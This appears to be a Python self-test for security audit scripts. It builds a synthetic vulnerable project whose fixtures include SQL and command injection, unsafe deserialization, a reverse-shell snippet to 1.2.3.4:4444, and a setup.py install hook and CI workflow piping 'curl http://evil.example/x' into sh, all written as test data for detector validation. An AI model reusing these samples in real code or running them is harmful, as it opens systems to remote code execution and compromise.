#!/usr/bin/env python3
"""Offline acceptance test for the audit scripts.

Builds a synthetic vulnerable project in a temp dir, runs all three scripts,
and asserts expected heuristic hits. No network, no external tools required.

Usage:
    python3 scripts/selftest.py
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

SCRIPT_DIR = Path(__file__).resolve().parent

VIEWS_PY = """\
import os, subprocess, pickle, yaml, base64, socket, pty
from flask import request, render_template_string

SECRET_KEY = "super-secret-hardcoded-key-123456"

def search():
    q = request.args.get("q")
    cursor.execute(f"SELECT * FROM items WHERE name = '{q}'")

def run():
    host = request.args.get("host")
    os.system("ping -c 1 " + host)
    subprocess.run(f"ls {host}", shell=True)
    eval(request.args.get("code"))
    exec(base64.b64decode("cHJpbnQoMSk="))

def load():
    return pickle.loads(request.data), yaml.load(request.data)

def shell():
    s = socket.socket()
    s.connect(("1.2.3.4", 4444))
    pty.spawn("/bin/sh")

def tmpl():
    return render_template_string(request.args.get("t"))

def read():
    return open(os.path.join("/srv/files", request.args.get("f"))).read()
"""

ENV_FILE = """\
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA
-----END RSA PRIVATE KEY-----
"""

SETUP_PY = """\
from setuptools import setup
from setuptools.command.install import install

class Evil(install):
    def run(self):
        import os
        os.system("curl http://evil.example/x | sh")
        super().run()

setup(name="vuln-sample", cmdclass={"install": Evil})
"""

WORKFLOW_YML = """\
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl http://evil.example/x | sh
"""

REQUIREMENTS = "django==3.2.0\nrequests==2.19.0\nPyYAML==5.1\n"
PYPROJECT = '[project]\nname = "vuln-sample"\ndependencies = ["flask==2.0.0", "jinja2==2.11.2"]\n'


def build_sample(root: Path) -> None:
    (root / "app").mkdir(parents=True)
    (root / "app" / "views.py").write_text(VIEWS_PY, encoding="utf-8")
    (root / ".env").write_text(ENV_FILE, encoding="utf-8")
    (root / "setup.py").write_text(SETUP_PY, encoding="utf-8")
    (root / "requirements.txt").write_text(REQUIREMENTS, encoding="utf-8")
    (root / "pyproject.toml").write_text(PYPROJECT, encoding="utf-8")
    (root / ".github" / "workflows").mkdir(parents=True)
    (root / ".github" / "workflows" / "ci.yml").write_text(
        WORKFLOW_YML, encoding="utf-8"
    )
    (root / "app" / "evil.pyc").write_bytes(b"\x00\x01binary")


def run_script(script: str, out: Path, root: Path, extra: list[str]) -> dict:
    env = dict(os.environ, PYTHONDONTWRITEBYTECODE="1")
    proc = subprocess.run(
        [
            sys.executable,
            str(SCRIPT_DIR / script),
            "--path",
            str(root),
            "--json",
            str(out),
            *extra,
        ],
        capture_output=True,
        text=True,
        env=env,
        check=False,
    )
    if proc.returncode != 0:
        raise AssertionError(f"{script} exited {proc.returncode}: {proc.stderr}")
    payload = json.loads(out.read_text(encoding="utf-8"))
    return payload


def main() -> int:
    failures: list[str] = []
    tmp = Path(tempfile.mkdtemp(prefix="pysec-selftest-"))
    try:
        root = tmp / "vuln-sample"
        root.mkdir()
        build_sample(root)

        # --- hunt_anomalies ---
        anomalies = run_script("hunt_anomalies.py", tmp / "a.json", root, [])
        rules = {f["rule"] for f in anomalies["findings"]}
        expected_rules = {
            "H001",  # exec/eval
            "H002",  # os.system / shell=True
            "H003",  # pickle / yaml.load
            "H004",  # decode-then-exec
            "H005",  # reverse shell primitive
            "H012",  # setup.py cmdclass
            "H015",  # pull_request_target / curl|sh
            "H016",  # private key
            "H017",  # AWS access key
            "H100",  # binary artifact
        }
        missing = expected_rules - rules
        if missing:
            failures.append(f"hunt_anomalies missing rules: {sorted(missing)}")
        secrets = [
            f for f in anomalies["findings"] if f["rule"] in {"H016", "H017", "H018"}
        ]
        if any(
            "AKIA" in f["snippet"] and f["snippet"].count("AKIA") > 1 for f in secrets
        ):
            failures.append("secret snippet not redacted")
        if anomalies["meta"]["files_scanned"] < 5:
            failures.append("hunt_anomalies scanned too few files")

        # --- check_deps (offline) ---
        deps = run_script("check_deps.py", tmp / "d.json", root, ["--offline"])
        names = {p["name"].lower() for p in deps["packages"]}
        if not {"django", "flask", "jinja2", "pyyaml", "requests"} <= names:
            failures.append(f"check_deps packages incomplete: {sorted(names)}")
        django = next(p for p in deps["packages"] if p["name"].lower() == "django")
        if django["version"] != "3.2.0":
            failures.append(f"check_deps django version wrong: {django['version']}")
        if deps["findings"]:
            failures.append("offline mode must not produce findings")

        # --- scan (structure only; tools may be missing) ---
        scan = run_script("scan.py", tmp / "s.json", root, [])
        tools = scan["meta"]["tools"]
        for tool in ("bandit", "semgrep", "ruff"):
            if tool not in tools:
                failures.append(f"scan.py missing tool entry: {tool}")
            elif tools[tool].get("status") not in {
                "ok",
                "skipped",
                "error",
                "disabled",
            }:
                failures.append(f"scan.py {tool} bad status: {tools[tool]}")
        if not isinstance(scan["findings"], list):
            failures.append("scan.py findings not a list")
        if "note" not in scan["summary"]:
            failures.append("scan.py summary missing note")

        print(
            json.dumps(
                {
                    "hunt_rules": sorted(rules),
                    "packages": len(deps["packages"]),
                    "scan_tools": {k: v.get("status") for k, v in tools.items()},
                },
                ensure_ascii=False,
                indent=2,
            )
        )
    except Exception as exc:  # noqa: BLE001 - report any failure as test failure
        failures.append(str(exc))
    finally:
        for p in (tmp / "vuln-sample",):
            if p.exists():
                import shutil

                shutil.rmtree(p, ignore_errors=True)
        for f in ("a.json", "d.json", "s.json"):
            (tmp / f).unlink(missing_ok=True)
        try:
            tmp.rmdir()
        except OSError:
            pass

    if failures:
        print("SELFTEST FAILED:")
        for item in failures:
            print(f"  - {item}")
        return 1
    print("SELFTEST OK")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
